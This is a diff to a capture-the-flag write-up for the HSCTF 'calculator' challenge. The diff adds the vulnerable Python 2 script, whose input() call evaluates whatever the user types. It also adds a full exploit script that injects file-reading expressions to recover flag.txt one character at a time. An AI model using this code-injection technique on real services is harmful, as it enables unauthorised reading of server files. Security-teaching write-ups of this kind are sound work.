@@ -4,8 +4,9 @@
 3. [Category](#Category)
 4. [Challenge Name](#Challenge-Name)
 5. [Challenge Description](#Challenge-Description)
-6. [Challenge Points](#Challenge-Points)
-7. [Solution](#Solution)
+6. [Attachments](#Attachments)
+7. [Challenge Points](#Challenge-Points)
+8. [Solution](#Solution)
   1. [Code Analysis](#Code-Analysis)
   2. [Vulnerabilities](#Vulnerabilities)
   3. [Getting Our Hands Dirty](#Getting-Our-Hands-Dirty)
@@ -28,7 +29,41 @@ I’m really new to python. Please don’t break my calculator!
 
 There is a flag.txt on the server.
 
-Attachments: [calculator.py](https://pastebin.com/NGickNbp)
+# Attachments
+
+## calculator.py
+
+``` python2
+#!/usr/bin/env python2.7
+ 
+try:
+    print("Welcome to my calculator!")
+    print("You can add, subtract, multiply and divide some numbers")
+ 
+    print("")
+ 
+    first = int(input("First number: "))
+    second = int(input("Second number: "))
+ 
+    operation = str(raw_input("Operation (+ - * /): "))
+ 
+    if first != 1 or second != 1:
+        print("")
+        print("Sorry, only the number 1 is supported")
+ 
+    if first == 1 and second == 1 and operation == "+":
+        print("1 + 1 = 2")
+    if first == 1 and second == 1 and operation == "-":
+        print("1 - 1 = 0")
+    if first == 1 and second == 1 and operation == "*":
+        print("1 * 1 = 1")
+    if first == 1 and second == 1 and operation == "/":
+        print("1 / 1 = 1")
+    else:
+        print(first + second)
+except ValueError:
+    pass
+```
 
 # Challenge Points
 100 pts
@@ -52,11 +87,11 @@ To do that we connect to the server and pass in the following piece of code as t
 `len(open('flag.txt', 'r').readline().split()[0])`
 
 What it does is simply 
-opening the flag.txt file in reading mode
-reading its content
-splitting the content into a list
-selecting the first element of the list (the flag)
-returning its length
+* opening the flag.txt file in reading mode
+* reading its content
+* splitting the content into a list
+* selecting the first element of the list (the flag)
+* returning its length
 
 For the second input we pass 0 as we don’t want to mess up the length value,
 and for the third one we can pass either ‘+’ or ‘-’
@@ -75,8 +110,96 @@ We still pass 0 and either ‘+’ or ’-’ to the next two inputs and we woul
 All we have to do now is repeat this procedure for every character of the string.
 It would take quite a lot of time to do that by hand, so i decided to automatize it with this simple script.
 
-Once we run it, and wait a few seconds we would get the flag:
+``` python2
+#!/usr/bin/python2
+ 
+import socket
+ 
+#Custom method to easily send the payload over the socket
+def send(sock, payload):
+    sent = False
+ 
+    #Waiting for the first input request
+    while not sent:
+        data = sock.recv(1024)
+        if "First" in data:
+            #Sending the payload to the server
+            sock.send(payload)
+            sent = True
+ 
+    sent = False
+ 
+    #Waiting for the second input request
+    while not sent:
+        data = sock.recv(1024)
+        if "Second" in data:
+            #Sending 0 as second input
+            sock.send("0\n")
+            sent = True
+ 
+    sent = False
+ 
+    #Waiting for the third input request
+    while not sent:
+        data = sock.recv(1024)
+        if "Operation" in data:
+            #sending '+' as third input
+            sock.send("+\n")
+            sent = True
+ 
+    #Waiting for the result to be calculated
+    while "Sorry" not in data:
+        data = s.recv(1024)
+ 
+    #returning the result of the calculation
+    return int(data[-4:-1])
+ 
+if __name__ == "__main__":
+ 
+    HOST = "misc.hsctf.com"
+    PORT = 7001
+ 
+    flag = ""
+    FLAG_LEN = 0
+    new_char = 0
+ 
+    #Enstablishing connection with the server
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("misc.hsctf.com", 7001))
+ 
+    #Finding the flag length so we can later initialize a loop
+    #to get each flag characters
+    if FLAG_LEN == 0:
+        print("[*] Getting flag length...")
+ 
+        #Sending the first code to get the flag length
+        FLAG_LEN = send(s, "len(open('flag.txt', 'r').readline().split()[0])\n")
+        print("[*] Got length: {}".format(FLAG_LEN))
+ 
+        #Closing the server socket
+        s.close()
+ 
+    #Looping through each flag char
+    for i in range(0, FLAG_LEN):
+ 
+        #Enstablishing conneciton with the server
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(("misc.hsctf.com", 7001))
+ 
+        #Sending the second code the get the ASCII value of the char at i position
+        new_char = chr(send(s, "ord(open('flag.txt', 'r').readline()[{}])\n".format(i)))
+        print("[*] Got char: {}".format(new_char))
+ 
+        #Appending char to flag's string
+        flag += new_char
+ 
+        #Closing the server socket
+        s.close()
+ 
+    print(flag)
+```
 
+Once we run it, we wait a few seconds and we would get the flag:
 `flag{please_use_python3}`
 
 (It's fun since I wrote the script using python2 lmao)
